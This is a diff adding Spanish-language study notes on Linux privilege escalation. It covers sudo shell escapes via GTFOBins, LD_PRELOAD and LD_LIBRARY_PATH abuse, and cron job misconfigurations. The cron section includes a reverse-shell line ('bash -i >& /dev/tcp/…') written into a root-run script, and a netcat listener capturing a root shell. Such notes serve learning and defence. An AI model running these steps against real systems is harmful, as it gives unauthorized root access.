@@ -357,3 +357,142 @@ $ sudo passwd
 
 Incluso si no hay métodos "obvios" para escalar privilegios, podemos
 ser capaces de utilizar una secuencia de escape del shell.
+
+## Shell Escape Sequences
+
+<p>Incluso si estamos restringidos a ejecutar ciertos programas a través de sudo, es a veces es posible "escapar" del programa y generar un shell.</p>
+<p>Como el programa inicial se ejecuta con privilegios de root, también lo hace el shell generada.
+Una lista de programas con sus secuencias de escape de shell se puede encontrar aquí: https://gtfobins.github.io/ </p>
+
+## Privilege Escalation (Generic)
+
+1- Enumere los programas que su usuario puede ejecutar a través de sudo:
+
+```
+sudo -l
+NOPASSWD: /usr/sbin/iftop
+NOPASSWD: /usr/bin/find
+NOPASSWD: /usr/bin/nano
+NOPASSWD: /usr/bin/vim
+NOPASSWD: /usr/bin/man
+NOPASSWD: /usr/bin/awk
+```
+
+2- Para cada programa de la lista, ver si hay una secuencia de escape del shell secuencia de escape en GTFOBins
+(https://gtfobins.github.io/)
+
+3- Si existe una secuencia de escape, ejecute el programa mediante sudo y ejecute la secuencia para generar un shell
+shell.
+
+## Abuso de la funcionalidad prevista
+
+ <p>Si un programa no tiene una secuencia de escape, todavía puede ser
+posible utilizarlo para escalar privilegios.
+Si podemos leer archivos propiedad de root, podemos ser capaces de extraer información útil (por ejemplo, contraseñas, hashes, claves).
+Si podemos escribir en los archivos propiedad de root, podemos ser capaces de insertar o modificar información. </p>
+
+## Variables de entorno
+
+ <p>Los programas ejecutados a través de sudo pueden heredar las variables de entorno del entorno del usuario.
+En el archivo de configuración /etc/sudoers, si se establece la opción env_reset, sudo ejecutará los programas en un nuevo entorno mínimo.
+La opción env_keep puede ser usada para mantener ciertas variables de entorno del entorno del usuario.
+Las opciones configuradas se muestran al ejecutar sudo -l. </p>
+
+## LD_PRELOAD
+
+<p>LD_PRELOAD es una variable de entorno que puede establecerse a
+la ruta de un archivo de objeto compartido (.so).
+Cuando se establece, el objeto compartido se cargará antes que cualquier otro.
+Creando un objeto compartido personalizado y creando una función init() podemos ejecutar código tan pronto como se cargue el objeto.</p>
+
+## Limitations
+
+<p>LD_PRELOAD no funcionará si el ID de usuario real es diferente
+del ID de usuario efectivo.
+sudo debe ser configurado para preservar la variable de entorno LD_PRELOAD utilizando la opción env_keep.</p>
+
+## Privilege Escalation
+
+falta desarrollar
+
+## LD_LIBRARY_PATH
+
+La variable de entorno LD_LIBRARY_PATH contiene un conjunto de directorios donde se buscan primero las bibliotecas compartidas.
+El comando ldd puede utilizarse para imprimir las bibliotecas compartidas utilizadas por un programa:
+
+```
+$ ldd /usr/sbin/apache2
+```
+
+Creando una biblioteca compartida con el mismo nombre que la utilizada por un programa, y estableciendo LD_LIBRARY_PATH en su directorio padre, el programa cargará nuestra biblioteca compartida en su lugar.
+
+## Privilege Escalation
+
+falta desarrollar
+
+#
+
+## Cron Jobs
+
+<p>Los Cron jobs son programas o scripts que los usuarios pueden programar para para que se ejecuten en momentos o intervalos específicos.
+Los Cron jobs se ejecutan con el nivel de seguridad del usuario que los posee que los posee.
+Por defecto, los cron jobs se ejecutan utilizando el shell /bin/sh, con
+variables de entorno limitadas. </p>
+
+<p>Los archivos de tabla de cron (crontabs) almacenan la configuración de trabajos de cron.
+<p>Los crontabs de usuario suelen estar ubicados en /var/spool/cron/ o
+/var/spool/cron/crontabs/ .</p>
+<p> El crontab de todo el sistema se encuentra en /etc/crontab.</p>
+
+## File Permissions
+
+Una mala configuración de los permisos de los archivos asociados a los trabajos cron puede llevar a una fácil escalada de privilegios.
+Si podemos escribir en un programa o script que se ejecuta como parte de un trabajo cron, podemos reemplazarlo con nuestro propio código.
+
+## Privilege Escalation
+
+1- Ver el contenido del crontab de todo el sistema:
+
+```
+$ cat /etc/crontab
+...
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+```
+
+2- Localice el archivo overwrite.sh en el servidor:
+
+```
+$ locate overwrite.sh
+/usr/local/bin/overwrite.sh
+```
+
+3- Check the file’s permissions:
+
+```
+$ ls -l /usr/local/bin/overwrite.sh
+-rwxr--rw- 1 root staff 40 May 13 2017 /usr/local/bin/overwrite.sh
+```
+
+4- Reemplace el contenido del archivo overwrite.sh con lo siguiente:
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.1.26/53 0>&1
+```
+
+5- Ejecute un listener de netcat en su máquina local y espere a que
+que se ejecute la tarea cron. Un shell inverso ejecutado como el usuario debería ser capturado:
+
+```
+# nc –nvlp 53
+Listening on [any] 53 ...
+Connect to [192.168.1.26] from (UNKNOWN) [192.168.1.25] 47352
+bash: no job control in this shell
+root@debian:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+```
+
+## PATH Environment Variable
